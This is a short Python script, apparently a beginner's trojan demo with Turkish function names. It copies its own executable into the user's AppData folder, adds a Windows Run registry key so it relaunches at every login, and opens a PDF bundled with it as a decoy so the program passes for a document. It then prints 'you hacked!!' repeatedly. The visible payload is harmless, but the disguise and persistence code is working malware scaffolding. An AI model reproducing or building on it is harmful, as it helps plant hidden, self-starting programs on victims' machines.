import time
import subprocess
import os
import shutil
import sys

def regedite_ekle():
	eklenecek_dosya = os.environ["appdata"] + "\\blabla.exe"
	if not os.path.exists(eklenecek_dosya):
		shutil.copyfile(sys.executable,eklenecek_dosya)

		regedit_kodu = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v blabla /t REG_SZ /d " + eklenecek_dosya
		subprocess.call(regedit_kodu,shell=True)

regedite_ekle()

def pdff_ekleme():
	pdff_ekle = sys._MEIPASS + "\\blabla.pdf"
	subprocess.Popen(pdff_ekle, shell=True)
pdff_ekleme()

i = 0
while i < 500:
	i+=1
	print("you hacked!!")
	time.sleep(0.5)

